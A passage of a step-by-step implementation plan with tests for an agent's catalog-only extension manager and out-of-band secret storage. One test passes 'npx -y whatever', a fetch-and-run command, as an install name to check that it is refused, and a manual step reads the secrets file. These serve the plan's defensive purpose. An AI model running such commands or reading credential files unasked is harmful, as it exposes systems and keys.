- [ ] **Step 6: Wire it through the dispatcher**

In `src/claude_hermes/gateway/telegram.py`, `create_dispatcher` gains a `home` parameter, fills
`message_id`, and binds a per-message deleter:

```python
def create_dispatcher(runner, cfg: Config, bot_username: str, acl, *, sender, titler,
                      home: Path):
```

Inside `on_message`, add `message_id=message.message_id` to the `MessageEvent(...)` construction,
and define the deleter above the `Presenter`:

```python
        async def delete_message() -> None:
            await message.delete()
```

Then pass both new arguments to `handle_event`:

```python
                reply = await handle_event(runner, cfg, event, acl=acl, home=home,
                                           progress=presenter.on_event,
                                           delete_message=delete_message)
```

- [ ] **Step 7: Update the caller in `main.py`**

In `src/claude_hermes/main.py`, `run()` does not currently hold `home` — it calls `get_home()`
where it needs it. Do the same at the `create_dispatcher` call (line 78):

```python
    dp = create_dispatcher(runner, cfg, bot_username=me.username or "", acl=acl,
                           sender=sender, titler=titler, home=get_home())
```

- [ ] **Step 8: Run the tests**

Run: `.venv/Scripts/python -m pytest tests/test_secret_command.py tests/test_acl.py tests/test_telegram.py -v`
Expected: all pass. If `tests/test_telegram.py` calls `handle_event` without `home`, add
`home=tmp_path` to those calls — the parameter is required by design, so that a future call site
cannot forget where secrets live.

- [ ] **Step 9: Run the whole suite**

Run: `.venv/Scripts/python -m pytest -q`
Expected: all pass.

- [ ] **Step 10: Commit**

```bash
git add src/claude_hermes/acl.py src/claude_hermes/gateway/events.py src/claude_hermes/gateway/telegram.py src/claude_hermes/main.py tests/test_secret_command.py tests/test_acl.py tests/test_telegram.py
git commit -m "feat(gateway): /secret stores a key without it ever reaching the model"
```

---

### Task 9: wire the composer into the turn and into cron

**Files:**
- Modify: `src/claude_hermes/runner.py`, `src/claude_hermes/cron/executor.py`, `src/claude_hermes/cron/ticker.py`, `src/claude_hermes/main.py`, `src/claude_hermes/config.py`, `config.yaml.example`
- Test: `tests/test_runner_extensions.py`, `tests/test_cron_executor.py` (extend)

**Interfaces:**
- Consumes: `compose.for_scope` (Task 5).
- Produces:
  - `AgentRunner._ext_store` (set by `main.py`, `None` disables the feature)
  - `run_job(cfg, home, db, job, ext_store=None)`
  - `CronTicker(cfg, home, db, job_store, deliver, ext_store=None)`
  - `Config.ext_probe_timeout_seconds: float = 60.0`, `Config.plugin_clone_timeout_seconds: float = 120.0`

- [ ] **Step 1: Write the failing test**

`tests/test_runner_extensions.py`:

```python
import yaml

import claude_hermes.runner as runner_mod
from claude_hermes.config import Config
from claude_hermes.db import Database
from claude_hermes.extensions import catalog, compose, secrets
from claude_hermes.extensions.store import ExtensionStore
from claude_hermes.memory import MemoryStore
from claude_hermes.runner import AgentRunner
from claude_hermes.sessions import SessionRouter

NOW = "2026-07-14T10:00:00+00:00"
HTTP = {
    "manifest_version": 1, "name": "example", "label": "Example", "description": "d",
    "version": "1.0.0", "transport": "http", "url": "https://mcp.example.com/mcp",
    "scopes": ["turn", "cron"],
}


async def build(tmp_path, with_ext: bool):
    root = tmp_path / "catalog"
    (root / "mcp").mkdir(parents=True)
    (root / "mcp" / "example.yaml").write_text(yaml.safe_dump(HTTP), encoding="utf-8")

    db = await Database.open(tmp_path / "state.db")
    cfg = Config()
    runner = AgentRunner(cfg, tmp_path, db, SessionRouter(db, cfg),
                         MemoryStore(tmp_path, 2200, 1375))
    if with_ext:
        store = ExtensionStore(db)
        await store.add("example", "mcp", "1.0.0", installed_by=1, now=NOW)
        runner._ext_store = store
        runner._catalog_root = root
    return db, runner


async def test_an_installed_server_reaches_the_options(tmp_path, monkeypatch):
    db, runner = await build(tmp_path, with_ext=True)
    seen = {}

    async def fake_query(*, prompt, options):
        seen["options"] = options

        class R:
            session_id = "s"
            result = "ok"
        yield R()

    monkeypatch.setattr(runner_mod, "query", fake_query)
    await runner.run_turn("tg:private:1", "привет")

    opts = seen["options"]
    assert "example" in opts.mcp_servers          # alongside 'hermes'
    assert "hermes" in opts.mcp_servers
    assert "mcp__example" in opts.allowed_tools
    await db.close()


async def test_without_a_store_the_options_are_unchanged(tmp_path, monkeypatch):
    """The feature must be inert until main.py wires it."""
    db, runner = await build(tmp_path, with_ext=False)
    seen = {}

    async def fake_query(*, prompt, options):
        seen["options"] = options

        class R:
            session_id = "s"
            result = "ok"
        yield R()

    monkeypatch.setattr(runner_mod, "query", fake_query)
    await runner.run_turn("tg:private:1", "привет")

    assert set(seen["options"].mcp_servers) == {"hermes"}
    await db.close()
```

Append to `tests/test_cron_executor.py`:

```python
async def test_cron_sees_an_in_scope_server(tmp_path, monkeypatch):
    import yaml

    from claude_hermes.extensions.store import ExtensionStore

    root = tmp_path / "catalog"
    (root / "mcp").mkdir(parents=True)
    (root / "mcp" / "example.yaml").write_text(yaml.safe_dump({
        "manifest_version": 1, "name": "example", "label": "E", "description": "d",
        "version": "1.0.0", "transport": "http", "url": "https://mcp.example.com/mcp",
        "scopes": ["cron"],
    }), encoding="utf-8")

    db = await make_db(tmp_path)
    store = ExtensionStore(db)
    await store.add("example", "mcp", "1.0.0", installed_by=1,
                    now="2026-07-14T10:00:00+00:00")
    seen = {}

    async def fake_query(*, prompt, options):
        seen["options"] = options

        class R:
            session_id = "s"
            result = "done"
        yield R()

    monkeypatch.setattr(ex_mod, "query", fake_query)
    await run_job(Config(), tmp_path, db, JOB, ext_store=store, catalog_root=root)

    assert "example" in seen["options"].mcp_servers
    assert "mcp__example" in seen["options"].allowed_tools
    await db.close()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_runner_extensions.py -v`
Expected: FAIL — `AssertionError: assert 'example' in {'hermes': ...}`

- [ ] **Step 3: Wire the runner**

In `src/claude_hermes/runner.py`, add the import:

```python
from .extensions import compose
```

Add two attributes to `AgentRunner.__init__` next to the other `main.py`-injected ones:

```python
        self._ext_store = None  # set by main.py; None → no external extensions
        self._catalog_root = None  # tests point this at a fixture catalog
```

In `_execute`, after `server, mcp_tool_names = build_hermes_server(...)`, insert:

```python
        composed = compose.Composed()
        if self._ext_store is not None:
            composed = await compose.for_scope(
                self._home, self._ext_store, "turn", root=self._catalog_root
            )
```

and change the two option lines:

```python
            allowed_tools=_BUILTIN_TOOLS + mcp_tool_names + composed.tool_names,
            mcp_servers={"hermes": server, **composed.mcp_servers},
            plugins=composed.plugins,
```

- [ ] **Step 4: Wire cron**

In `src/claude_hermes/cron/executor.py`, add `from ..extensions import compose`, and change the
signature and the options:

```python
async def run_job(cfg: Config, home: Path, db: Database, job: dict,
                  ext_store=None, catalog_root=None) -> tuple[str, str]:
    session_key = f"cron:{job['id']}"
    now = datetime.now(timezone.utc)

    composed = compose.Composed()
    if ext_store is not None:
        composed = await compose.for_scope(home, ext_store, "cron", root=catalog_root)

    options = base_options(
        home,
        model=cfg.cron_model or cfg.model,
        max_turns=cfg.max_turns,
        system_prompt={"type": "preset", "preset": "claude_code",
                       "append": f"{CRON_APPEND}\n\nToday's date: {now.date().isoformat()}"},
        allowed_tools=_TOOLS + composed.tool_names,
        mcp_servers=composed.mcp_servers,
        plugins=composed.plugins,
        hooks={"PreToolUse": [HookMatcher(matcher="Bash", hooks=[bash_guard])]},
        env=NO_ADVISOR_ENV,
    )
```

In `src/claude_hermes/cron/ticker.py`, `CronTicker.__init__` gains `ext_store=None` (stored as
`self._ext_store`), and the `run_job` call in `tick()` becomes:

```python
            status, out = await run_job(self._cfg, self._home, self._db, job,
                                        ext_store=self._ext_store)
```

- [ ] **Step 5: Add the two config knobs**

In `src/claude_hermes/config.py`, add to `Config` under the Phase 3 block:

```python
    # Phase 4 — extensions
    ext_probe_timeout_seconds: float = 60.0     # how long a server gets to hand-shake
    plugin_clone_timeout_seconds: float = 120.0  # how long `git clone` gets
```

Append to `config.yaml.example`:

```yaml
# Phase 4 — extensions (MCP servers and plugins from the curated catalog)
ext_probe_timeout_seconds: 60      # a server gets this long to complete its handshake
plugin_clone_timeout_seconds: 120  # `git clone` of a catalog plugin
```

- [ ] **Step 6: Wire `main.py`**

Add the import at the top of `src/claude_hermes/main.py`:

```python
from .extensions.store import ExtensionStore
```

In `build_app()`, replace the last three lines (`job_store = JobStore(db)` … `return …`) with:

```python
    acl = AccessControl(db, cfg)
    job_store = JobStore(db)
    runner._job_store = job_store
    ext_store = ExtensionStore(db)
    runner._ext_store = ext_store
    return cfg, db, runner, acl, sidecar, skills_dir, job_store, ext_store
```

In `run()`, widen the unpacking (line 44):

```python
    cfg, db, runner, acl, sidecar, skills_dir, job_store, ext_store = await build_app()
```

and pass the store to the ticker (line 90):

```python
    ticker = CronTicker(cfg, get_home(), db, job_store, deliver, ext_store=ext_store)
```

- [ ] **Step 7: Run the tests**

Run: `.venv/Scripts/python -m pytest tests/test_runner_extensions.py tests/test_cron_executor.py -v`
Expected: all pass

- [ ] **Step 8: Run the whole suite**

Run: `.venv/Scripts/python -m pytest -q`
Expected: all pass

- [ ] **Step 9: Commit**

```bash
git add src/claude_hermes/runner.py src/claude_hermes/cron/executor.py src/claude_hermes/cron/ticker.py src/claude_hermes/main.py src/claude_hermes/config.py config.yaml.example tests/test_runner_extensions.py tests/test_cron_executor.py
git commit -m "feat(extensions): installed servers and plugins reach the turn and cron"
```

---

### Task 10: the `ext_manage` tool

The agent-facing surface. Registered conditionally, exactly as `cron_manage` is.

**Files:**
- Modify: `src/claude_hermes/tools.py`, `src/claude_hermes/runner.py`, `src/claude_hermes/gateway/presenter.py:9-25`, `src/claude_hermes/main.py`
- Test: `tests/test_ext_manage.py`

**Interfaces:**
- Consumes: `catalog`, `compose`, `probe`, `install`, `secrets`, `ExtensionStore`, `AccessControl.is_owner`.
- Produces:
  - `@dataclass TurnFlags(reset_lane: bool = False)`
  - `TurnContext(session_key, chat_id, thread_id=None, user_id=0, flags=TurnFlags())`
  - the `mcp__hermes__ext_manage` tool.

- [ ] **Step 1: Write the failing test**

`tests/test_ext_manage.py`:

```python
import yaml

from claude_hermes.acl import AccessControl
from claude_hermes.config import Config
from claude_hermes.db import Database
from claude_hermes.extensions import secrets
from claude_hermes.extensions.probe import ProbeResult
from claude_hermes.extensions.store import ExtensionStore
from claude_hermes.tools import TurnContext, TurnFlags, make_handlers
import claude_hermes.tools as tools_mod
from claude_hermes.memory import MemoryStore

HTTP = {
    "manifest_version": 1, "name": "example", "label": "Example", "description": "d",
    "version": "1.0.0", "transport": "http", "url": "https://mcp.example.com/mcp",
    "scopes": ["turn"],
    "auth": [{"name": "EXAMPLE_API_KEY", "prompt": "Example API key",
              "url": "https://example.com/keys", "header": "Authorization",
              "format": "Bearer ${EXAMPLE_API_KEY}"}],
}


def text_of(result: dict) -> str:
    return result["content"][0]["text"]


async def build(tmp_path, user_id=1):
    root = tmp_path / "catalog"
    (root / "mcp").mkdir(parents=True)
    (root / "mcp" / "example.yaml").write_text(yaml.safe_dump(HTTP), encoding="utf-8")

    db = await Database.open(tmp_path / "state.db")
    acl = AccessControl(db, Config())
    await acl.check(1, "private")                 # user 1 is the owner
    store = ExtensionStore(db)
    ctx = TurnContext(session_key="tg:private:1", chat_id=1, user_id=user_id,
                      flags=TurnFlags())
    handlers = make_handlers(
        MemoryStore(tmp_path, 2200, 1375), db, ctx=ctx, cfg=Config(),
        ext_store=store, acl=acl, home=tmp_path, catalog_root=root,
    )
    return db, store, ctx, handlers["ext_manage"]


async def test_catalog_lists_what_can_be_installed(tmp_path):
    db, _, _, ext = await build(tmp_path)
    out = text_of(await ext({"action": "catalog"}))
    assert "example" in out and "Example API key" not in out
    await db.close()


async def test_add_without_the_secret_asks_for_it_and_installs_nothing(tmp_path):
    db, store, ctx, ext = await build(tmp_path)
    out = text_of(await ext({"action": "add", "name": "example"}))

    assert "EXAMPLE_API_KEY" in out
    assert "/secret" in out
    assert "https://example.com/keys" in out
    assert await store.get("example") is None      # nothing installed
    assert ctx.flags.reset_lane is False           # nothing changed → no reset
    await db.close()


async def test_add_probes_and_registers(tmp_path, monkeypatch):
    db, store, ctx, ext = await build(tmp_path)
    secrets.put(tmp_path, "EXAMPLE_API_KEY", "abc")

    async def ok_probe(home, name, spec, timeout=60.0):
        return ProbeResult(status="connected", tools=["search", "create"])

    monkeypatch.setattr(tools_mod, "probe", ok_probe)
    out = text_of(await ext({"action": "add", "name": "example"}))

    assert "2 tools" in out
    row = await store.get("example")
    assert row["state"] == "enabled" and row["installed_by"] == 1
    assert ctx.flags.reset_lane is True            # the lane must restart
    await db.close()


async def test_a_failing_probe_registers_nothing(tmp_path, monkeypatch):
    db, store, ctx, ext = await build(tmp_path)
    secrets.put(tmp_path, "EXAMPLE_API_KEY", "abc")

    async def bad_probe(home, name, spec, timeout=60.0):
        return ProbeResult(status="failed", error="connection refused")

    monkeypatch.setattr(tools_mod, "probe", bad_probe)
    out = text_of(await ext({"action": "add", "name": "example"}))

    assert "connection refused" in out
    assert await store.get("example") is None
    assert ctx.flags.reset_lane is False
    await db.close()


async def test_add_of_an_unknown_name_is_refused(tmp_path):
    db, store, _, ext = await build(tmp_path)
    out = text_of(await ext({"action": "add", "name": "npx -y whatever"}))
    assert "not in the catalog" in out
    assert await store.get("npx -y whatever") is None
    await db.close()


async def test_a_non_owner_may_not_install(tmp_path):
    db, store, _, ext = await build(tmp_path, user_id=2)
    out = text_of(await ext({"action": "add", "name": "example"}))
    assert "owner" in out.lower()
    assert await store.get("example") is None
    await db.close()


async def test_a_non_owner_may_still_read(tmp_path):
    db, _, _, ext = await build(tmp_path, user_id=2)
    assert "example" in text_of(await ext({"action": "catalog"}))
    await db.close()


async def test_list_shows_state_and_error(tmp_path):
    db, store, _, ext = await build(tmp_path)
    await store.add("example", "mcp", "1.0.0", installed_by=1,
                    now="2026-07-14T10:00:00+00:00")
    await store.set_error("example", "connection refused")
    out = text_of(await ext({"action": "list"}))
    assert "example" in out and "enabled" in out and "connection refused" in out
    await db.close()


async def test_disable_flips_state_and_resets_the_lane(tmp_path):
    db, store, ctx, ext = await build(tmp_path)
    await store.add("example", "mcp", "1.0.0", installed_by=1,
                    now="2026-07-14T10:00:00+00:00")
    await ext({"action": "disable", "name": "example"})

    assert (await store.get("example"))["state"] == "disabled"
    assert ctx.flags.reset_lane is True
    await db.close()


async def test_remove_drops_the_row_and_resets_the_lane(tmp_path):
    db, store, ctx, ext = await build(tmp_path)
    await store.add("example", "mcp", "1.0.0", installed_by=1,
                    now="2026-07-14T10:00:00+00:00")
    await ext({"action": "remove", "name": "example"})

    assert await store.get("example") is None
    assert ctx.flags.reset_lane is True
    await db.close()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/Scripts/python -m pytest tests/test_ext_manage.py -v`
Expected: FAIL — `ImportError: cannot import name 'TurnFlags' from 'claude_hermes.tools'`

- [ ] **Step 3: Add `TurnFlags` and extend `TurnContext`**

In `src/claude_hermes/tools.py`, replace the `TurnContext` dataclass with:

```python
@dataclass
class TurnFlags:
    """Mutable side-channel from a tool back to the runner. A tool cannot reset the
    session itself: the runner writes the session row back *after* the turn, so a
    mid-turn delete would simply be re-inserted. It raises the flag; the runner acts
    on it once the turn is over."""
    reset_lane: bool = False


@dataclass(frozen=True)
class TurnContext:
    session_key: str
    chat_id: int
    thread_id: int | None = None
    user_id: int = 0
    flags: TurnFlags = field(default_factory=TurnFlags)
```

and extend the imports at the top of the file:

```python
from dataclasses import dataclass, field
from pathlib import Path

from .extensions import catalog, compose, install, secrets
from .extensions.probe import probe
```

- [ ] **Step 4: Write the `ext_manage` handler**

In `src/claude_hermes/tools.py`, extend the signature of `make_handlers`:

```python
def make_handlers(store: MemoryStore, db: Database, ctx: TurnContext | None = None,
                   job_store=None, cfg=None, sidecar=None, skills_dir=None,
                   topics=None, ext_store=None, acl=None, home: Path | None = None,
                   catalog_root=None) -> dict:
```

Add the handler (next to `cron_manage`):

```python
    async def ext_manage(args: dict) -> dict:
        def reply(text: str) -> dict:
            return {"content": [{"type": "text", "text": text}]}

        action = args.get("action", "list")
        name = (args.get("name") or "").strip()
        kind_filter = args.get("kind") or None
        entries = catalog.load_all(catalog_root)

        if action == "catalog":
            wanted = [m for m in entries.values()
                      if kind_filter is None or m.kind == kind_filter]
            if not wanted:
                return reply("The catalog is empty.")
            return reply("\n".join(
                f"{m.name} [{m.kind}] {m.label} — {m.description.strip()}"
                for m in sorted(wanted, key=lambda m: m.name)
            ))

        if action == "list":
            rows = await ext_store.list(kind_filter)
            if not rows:
                return reply("Nothing installed. Use action='catalog' to see what's available.")
            return reply("\n".join(
                f"{r['name']} [{r['kind']}] {r['state']} v{r['catalog_version']}"
                + (f" — last error: {r['last_error']}" if r["last_error"] else "")
                for r in rows
            ))

        if not name:
            return reply(f"Action '{action}' needs a name.")

        # Everything below CHANGES what the agent is. Owner only — an allowlisted user
        # may talk to the agent, but may not re-arm it.
        if acl is not None and ctx is not None and not await acl.is_owner(ctx.user_id):
            return reply("Only the owner may install or change extensions.")

        if action in ("enable", "disable"):
            if await ext_store.get(name) is None:
                return reply(f"'{name}' is not installed.")
            await ext_store.set_state(name, "enabled" if action == "enable" else "disabled")
            _flag_reset()
            return reply(
                f"{'Enabled' if action == 'enable' else 'Disabled'} '{name}'. "
                "This thread's context starts fresh on your next message."
            )

        if action == "remove":
            row = await ext_store.get(name)
            if row is None:
                return reply(f"'{name}' is not installed.")
            if row["kind"] == "plugin":
                install.remove_plugin(home, name)
            await ext_store.remove(name)
            _flag_reset()
            return reply(
                f"Removed '{name}'. This thread's context starts fresh on your next message."
            )

        m = entries.get(name)
        if m is None:
            return reply(
                f"'{name}' is not in the catalog, so it cannot be installed. "
                "Use action='catalog' to see what is available. Servers are installed "
                "only from reviewed manifests — a command or URL from chat is refused "
                "by design."
            )

        secret_values = secrets.load(home)
        absent = secrets.missing(m.secret_names(), secret_values)
        if absent:
            wanted = [a for a in m.auth if a.name in absent]
            lines = [f"'{m.label}' needs {len(absent)} secret(s). Send each one as its own "
                     f"message — it is stored without ever reaching me:"]
            for a in wanted:
                lines.append(f"  /secret {a.name}=<value>")
                lines.append(f"     {a.prompt}" + (f" — {a.url}" if a.url else ""))
            lines.append("Then ask me to add it again.")
            return reply("\n".join(lines))

        if action == "test" or action == "add":
            if m.kind == "plugin":
                if action == "test":
                    return reply(
                        f"'{name}' is a plugin — nothing to probe. Use action='add'."
                    )
                timeout = cfg.plugin_clone_timeout_seconds if cfg else 120.0
                try:
                    await install.clone_plugin(home, m, timeout=timeout)
                except install.InstallError as e:
                    return reply(f"Could not install '{name}': {e}")
                await ext_store.add(m.name, m.kind, m.version,
                                    installed_by=ctx.user_id if ctx else 0,
                                    now=datetime.now(timezone.utc).isoformat())
                _flag_reset()
                return reply(
                    f"Installed plugin '{m.label}' ({m.repo}@{m.ref}). "
                    "This thread's context starts fresh on your next message."
                )

            try:
                spec = compose.server_spec(m, secret_values)
            except compose.ComposeError as e:
                return reply(f"Cannot build '{name}': {e}")

            timeout = cfg.ext_probe_timeout_seconds if cfg else 60.0
            result = await probe(home, m.name, spec, timeout=timeout)
            if result.status != "connected":
                return reply(
                    f"'{m.label}' did not come up: {result.error or result.status}. "
                    "Nothing was installed."
                )
            if action == "test":
                return reply(
                    f"'{m.label}' connects and offers {len(result.tools)} tools: "
                    f"{', '.join(result.tools)}. It is not installed — use action='add'."
                )

            await ext_store.add(m.name, m.kind, m.version,
                                installed_by=ctx.user_id if ctx else 0,
                                now=datetime.now(timezone.utc).isoformat())
            _flag_reset()
            return reply(
                f"Connected '{m.label}' — {len(result.tools)} tools "
                f"({', '.join(result.tools)}). This thread's context starts fresh on "
                "your next message; the tools are available from then on."
            )

        return reply(f"Unknown action '{action}'.")

    def _flag_reset() -> None:
        if ctx is not None:
            ctx.flags.reset_lane = True
```

Register it at the bottom of `make_handlers`, next to the other conditional registrations:

```python
    if ext_store is not None and home is not None:
        handlers["ext_manage"] = ext_manage
```

- [ ] **Step 5: Declare the tool**

In `build_hermes_server`, extend the signature to match `make_handlers`
(`ext_store=None, acl=None, home=None, catalog_root=None`), pass them through, and add after the
`skill_admin` block:

```python
    if "ext_manage" in handlers:
        ext_manage = tool(
            "ext_manage",
            "Install and manage extensions — MCP servers and Claude Code plugins. "
            "action=catalog|list|add|enable|disable|remove|test. Only names that "
            "appear in action='catalog' can be installed; an arbitrary command or "
            "URL is refused by design, so do not try to pass one. If 'add' reports a "
            "missing secret, relay the /secret line to the user verbatim — you must "
            "never ask them to type a key into the conversation, and you must never "
            "repeat a key back. add/enable/disable/remove restart this thread's "
            "context: say so.",
            {"action": str, "name": str, "kind": str},
        )(handlers["ext_manage"])
        tools_list.append(ext_manage)
        names.append("mcp__hermes__ext_manage")
```

- [ ] **Step 6: Act on the reset flag in the runner**

In `src/claude_hermes/runner.py`, move the `TurnContext` construction out of `_execute` and into
`_run_turn_locked`, so the runner can read the flag after the turn.

In `_run_turn_locked`, immediately after `now = datetime.now(timezone.utc)`:

```python
        ctx = TurnContext(
            session_key=session_key,
            chat_id=chat_id_from_key(session_key) or 0,
            thread_id=thread_id_from_key(session_key),
            user_id=user_id,
        )
```

Thread `ctx` through both `_execute(...)` calls (add it as the last positional argument), and in
`_execute` delete the local `ctx = TurnContext(...)` construction, taking `ctx` as a parameter
instead. Pass the new keywords to `build_hermes_server`:

```python
        server, mcp_tool_names = build_hermes_server(
            self._store, self._db, ctx=ctx, job_store=self._job_store, cfg=self._cfg,
            sidecar=self._sidecar, skills_dir=self._skills_dir, topics=self._topics,
            ext_store=self._ext_store, acl=self._acl, home=self._home,
            catalog_root=self._catalog_root,
        )
```

Add `self._acl = None  # set by main.py` to `__init__`.

`run_turn` gains the user id:

```python
    async def run_turn(self, session_key: str, user_text: str, progress=None,
                       user_id: int = 0) -> str:
        async with self._locks[session_key]:
            return await self._run_turn_locked(session_key, user_text, progress, user_id)
```

At the very end of `_run_turn_locked`, after the learning hook:

```python
        if ctx.flags.reset_lane:
            # An extension changed the toolset. Tool schemas are part of the cached
            # prefix, so the session must restart — and it must restart AFTER the
            # router has written the row back, or the bind above would resurrect it.
            await self._db.reset_session(session_key)
        return reply
```

In `src/claude_hermes/gateway/telegram.py`, pass the user id through:

```python
    return await runner.run_turn(key, text, progress=progress, user_id=event.user_id)
```

- [ ] **Step 7: Wire `main.py` and the presenter**

In `src/claude_hermes/main.py` `build_app()`, add `runner._acl = acl` immediately after
`acl = AccessControl(db, cfg)`. The runner needs it so `ext_manage` can enforce owner-only.

In `src/claude_hermes/gateway/presenter.py`, add to `_STATUS`:

```python
    "mcp__hermes__ext_manage": "🔌 Managing extensions…",
```

- [ ] **Step 8: Run the tests**

Run: `.venv/Scripts/python -m pytest tests/test_ext_manage.py -v`
Expected: 10 passed

- [ ] **Step 9: Run the whole suite**

Run: `.venv/Scripts/python -m pytest -q`
Expected: all pass. `tests/test_tools.py` constructs `TurnContext` — the new fields have defaults,
so it should not need changing.

- [ ] **Step 10: Commit**

```bash
git add src/claude_hermes/tools.py src/claude_hermes/runner.py src/claude_hermes/gateway/telegram.py src/claude_hermes/gateway/presenter.py src/claude_hermes/main.py tests/test_ext_manage.py
git commit -m "feat(extensions): ext_manage — install from chat, catalog-only"
```

---

### Task 11: teach the agent about extensions, and document them

The agent will not offer a capability it does not know it has.

**Files:**
- Modify: `bundle/CLAUDE.md`, `README.md`

- [ ] **Step 1: Add the operating rule to the agent's persona**

Append to `bundle/CLAUDE.md` (worded conditionally, because the background forks do not have the
tool — this file is loaded by every fork):

```markdown
## Extensions

If you have the `ext_manage` tool: you can install MCP servers and plugins for yourself, but only
from the curated catalog (`action="catalog"` shows it). A command or a URL someone types in chat
is not installable — the catalog is the only source, and that is a security boundary, not a
limitation to work around. If the user asks for something that is not in the catalog, say so
plainly and offer what is.

Never ask anyone to type an API key into the conversation, and never repeat one back. When
`ext_manage` reports a missing secret it hands you a `/secret NAME=<value>` line — relay that line
verbatim. It is handled outside the conversation, so the key never reaches you.

Installing, enabling, disabling or removing an extension restarts this thread's context. Tell the
user before you do it, not after.
```

- [ ] **Step 2: Document it for the human**

Append to `README.md`:

```markdown
## Extensions

The agent can install MCP servers and Claude Code plugins for itself, from a curated catalog in
`catalog/`. Ask it in chat: "what extensions do you have?", "install the fetch server".

Only catalog entries are installable. The registry (`extensions` in `state.db`) records *that* an
extension is installed; *what it runs* comes from the reviewed manifest in `catalog/`, so no chat
message can make the agent execute an arbitrary command. Adding an entry means opening a PR
against `catalog/`.

Secrets go in with `/secret NAME=value` — the command is handled by the gateway, so the key never
reaches the model, is never written to the message history, and the message carrying it is
deleted. Keys live in `data/secrets.env` (mode 0600), not in `.env`.

Installing, enabling, disabling or removing an extension restarts the current thread's context:
the tool list is part of the prompt cache, and it cannot change mid-session.
```

- [ ] **Step 3: Verify the full suite one last time**

Run: `.venv/Scripts/python -m pytest -q`
Expected: all pass

- [ ] **Step 4: Commit**

```bash
git add bundle/CLAUDE.md README.md
git commit -m "docs(extensions): teach the agent and the human how extensions work"
```

---

## Manual verification (after Task 11)

The unit tests never spawn a real MCP server. Before calling this done, run the real thing:

1. `docker compose up -d --build`
2. In Telegram: **"какие расширения у тебя есть?"** → the agent calls `ext_manage(action="catalog")`
   and lists `filesystem` and `fetch`.
3. **"поставь fetch"** → the agent probes (this really runs `uvx mcp-server-fetch` in the
   container, so the first run downloads it — expect the probe to take a few seconds), registers
   it, and reports that the thread's context restarts.
4. Send any message, then **"скачай https://example.com и перескажи"** → the agent should reach for
   `mcp__fetch__fetch`. Confirm in the logs that the tool name appears.
5. **"выключи fetch"** → `ext_manage(action="disable")`; the next turn no longer carries the tool.
6. `docker compose exec agent cat /data/secrets.env` → the file exists only if you stored a secret;
   check its mode with `stat -c %a /data/secrets.env` → `600`.

If step 3 fails with a probe timeout, raise `ext_probe_timeout_seconds` — a cold `uvx` download can
exceed 60s on a slow VPS.
